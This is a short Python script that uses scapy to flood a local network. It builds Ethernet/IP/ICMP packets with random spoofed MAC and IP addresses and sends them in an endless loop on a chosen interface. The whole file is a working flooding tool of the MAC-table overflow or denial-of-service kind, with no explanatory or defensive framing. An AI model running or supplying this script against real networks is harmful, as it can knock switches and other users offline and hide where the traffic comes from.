import sys
from scapy.all import *

packet = Ether(src=RandMAC("*:*:*:*:*:*"),
               dst=RandMAC("*:*:*:*:*:*")) / \
         IP(src=RandIP("*.*.*.*"),
            dst=RandIP("*.*.*.*")) / \
         ICMP()

if len(sys.argv) < 2:
    dev = "wlp4s0"

else:
    dev = sys.argv[1]

print("Flooding net with random packet on dev " + dev)
sendp(packet, iface=dev, loop=1)
